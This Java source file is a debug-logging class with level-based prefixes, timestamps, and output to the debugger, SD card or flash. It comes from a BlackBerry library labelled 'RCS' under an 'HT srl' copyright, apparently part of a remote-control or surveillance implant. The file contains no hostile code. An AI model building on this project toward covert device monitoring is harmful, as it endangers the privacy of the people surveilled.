/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Debug.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.utils;

import java.util.Calendar;
import java.util.Date;

import net.rim.device.api.i18n.DateFormat;
import net.rim.device.api.i18n.SimpleDateFormat;

import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;

//TODO: ottimizzare per togliere la chiamata in  Release
public class Debug {

    public static int level = 6;

    private static boolean logToDebugger = true;
    private static boolean logToSD = false;
    private static boolean logToFlash = false;

    private static boolean enabled = true;
    private static boolean init_ = false;

    // 1234567890123456
    String className = "                ";
    int actualLevel = 6;

    static DebugWriter debugWriter;

    public Debug(String className_) {
        this(className_, DebugLevel.VERBOSE);
    }

    public Debug(String className_, int classLevel) {
        int len = className_.length();
        this.className = className_ + className.substring(len);

        this.actualLevel = Math.min(classLevel, level);
    }

    /*
     * prior: priorita', da 6 bassa a bassa, level LEVEL = {
     * TRACE,DEBUG,INFO,WARN, ERROR, FATAL }
     */

    public static boolean init(boolean logToDebugger_,
            boolean logToSD_) {

        if (init_) {
            return false;
        }

        Debug.logToDebugger = logToDebugger_;
        Debug.logToSD = logToSD_;
        Debug.logToFlash = !logToSD_;

        if (logToFlash || logToSD) {
            debugWriter = new DebugWriter(logToSD);
            debugWriter.start();
        }

        init_ = true;

        return true;
    }

    public static synchronized void stop() {
        debugWriter.stop();

        try {
            debugWriter.join();
        } catch (InterruptedException e) {
        }

        init_ = false;
    }

    public void error(String message) {
        // #mdebug
        if (enabled) {
            trace("#ERR# " + className + " | " + message, DebugLevel.HIGH);
        }

        // #enddebug
    }

    public void fatal(String message) {
        // #mdebug
        if (enabled) {
            trace("#FTL# " + className + " | " + message, DebugLevel.CRITICAL);
        }

        // #enddebug
    }

    public void info(String message) {
        // #mdebug
        if (enabled) {
            trace("-INF- " + className + " | " + message, DebugLevel.NOTIFY);
        }

        // #enddebug
    }

    public void warn(String message) {
        // #mdebug
        if (enabled) {
            trace("-WRN- " + className + " | " + message, DebugLevel.LOW);
        }

        // #enddebug
    }

    public void trace(String message) {
        // #mdebug
        if (enabled) {
            trace("-   - " + className + " | " + message, DebugLevel.VERBOSE);
        }

        // #enddebug
    }

    private void logToDebugger(String string, int priority) {
        System.out.println(string);
    }

    private void logToFile(String message, int priority) {
        if (!init_) {
            logToDebugger("NOT INIT", DebugLevel.HIGH);
            if (!Debug.logToDebugger) {
                logToDebugger(message, priority);
            }
            return;
        }

        boolean ret = debugWriter.append(message);

        if (ret == false) {
            // TODO: procedura in caso di mancata scrittura
            logToDebugger(message, priority);
        }
    }

    /*
     * Scrive su file il messaggio, in append. Può scegliere se scrivere su
     * /store o su /SDCard Alla partenza dell'applicativo la SDCard non è
     * visibile.
     */
    private void trace(String message, int priority) {
        // #ifdef DBC
        Check.requires(priority > 0, "priority >0");
        // #endif

        if (priority > actualLevel || message == null) {
            return;
        }

        if (logToDebugger) {
            logToDebugger(message, priority);
        }

        if (logToSD || logToFlash) {
            long timestamp = (new Date()).getTime();
            /*
             * Calendar calendar = Calendar.getInstance(); calendar.setTime(new
             * Date());
             */

            DateFormat format = DateFormat.getInstance(DateFormat.TIME_FULL);
            String time = format.formatLocal(timestamp);

            /*
             * String time = calendar.get(Calendar.HOUR)+":"+
             * calendar.get(Calendar.MINUTE)+":"+ calendar.get(Calendar.SECOND);
             */

            logToFile(time + " " + message, priority);
        }
    }

}
